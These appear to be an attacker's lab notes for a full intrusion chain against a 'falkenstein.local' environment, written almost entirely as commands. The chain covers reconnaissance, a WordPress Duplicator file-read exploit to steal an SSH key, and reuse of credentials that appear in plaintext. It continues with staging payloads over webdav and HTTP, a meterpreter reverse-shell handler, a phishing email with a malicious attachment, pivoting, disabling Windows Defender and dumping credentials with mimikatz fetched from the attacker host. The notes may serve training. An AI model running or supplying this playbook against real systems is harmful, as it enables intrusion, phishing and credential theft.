## Information Gathering

### Passive
Google revealed that they have a website: falkenstein.local
### Active
```bash
sudo nmap -A --top-ports 50 falkenstein.local -oX - | xsltproc -o 0_overview.html - && firefox 0_overview.html
```

```bash
wpscan --url "http://falkenstein.local" --no-update --disable-tls-checks --plugins-detection aggressive --enumerate ap,cb
```

ap = all plugins
cb = configuration backups
## Initial Access
```bash
sp duplicator
```

```bash
sp -m 50420
```

```bash
vim 50420.py
```

```bash
python 50420.py http://falkenstein.local /etc/passwd
```
We find username karl
```bash
python 50420.py http://falkenstein.local /home/karl/.ssh/id_rsa
```

```bash
ssh -i id_rsa karl@falkenstein.local
```

```bash
cd /srv/www/wordpress
```

```bash
nano wp-config.php
```

```bash
sudo swaks -t anton@falkenstein.local --from karl@falkenstein.local --body @body_test.txt --header "Subject: Test" --suppress-data --server 172.16.42.200 -au karl -ap PLiMzCuJxAtEnfxfFJc8
```

```bash
git show
```

```bash
sudo swaks -t anton@falkenstein.local --from karl@falkenstein.local --body @body_test.txt --header "Subject: Test" --suppress-data --server 172.16.42.200 -au karl -ap sdw3edf9db$
```

#### Setup C2

- Host 2nd stage via webdav (shell 1)
```bash
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/Desktop/Falkenstein_Demo/Phishing/stage_2
```

( NOT NECESSARY WITH METERPRETER) Host the 3rd stage via HTTP (shell 2)
```bash
python3 -m http.server 8000 -d ~/Desktop/Falkenstein_Demo/Phishing/stage_3
```

- Receive reverse shell (shell 3)
```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_tcp; set LHOST 172.16.42.37; set LPORT 4444; set ExitOnSession false; run -j"
```

- Send Phish (shell 4)
```bash
sudo swaks -t anton@falkenstein.local --from f.cfurchensumpf@falkenstein.local --attach @config.Library-ms --body @body.txt --header "Subject: Horse Update" --suppress-data --server 172.16.42.200 -au karl -ap sdw3edf9db$
```

- Open Session (shell 3)
```msf
sessions -i 1
```

Strg + Z

```bash
use post/multi/manage/autoroute
```

```bash
set session 1
```

```bash
run -j
```
Ignore
	```bash
	use auxiliary/server/socks_proxy
	
	
	```bash
	run -j
	```

```bash
xfreerdp /u:"karl" /p:"sdw3edf9db$" /v:192.193.194.200 /dynamic-resolution /cert:ignore
```

Right-click on Start-Menu -> System shows we are on mail server. Navigate to:
`Program Files (x86)/Mail Enable/Postoffices/falkenstein.local/MAILROOT/f.cfurchensumpf/Inbox/`
- `_inbox` contains mail subjects and the corresponding mail file
-  The corresponding .MAI file can be opened with the editor
-> We have the local Administrators Password

Login with that over RDP. Disable windows defender (note that none of this was detected by defender so far!)

Connect from the MAILSRV to somewhere using RDP and set the checkbox "store credentials"

Download mimikatz from 172.16.42.37/mimikatz/x64/mimikatz.exe and execute with `.\mimikatz.exe privilege::debug token::elevate` then do `sekurlsa::logonpasswords`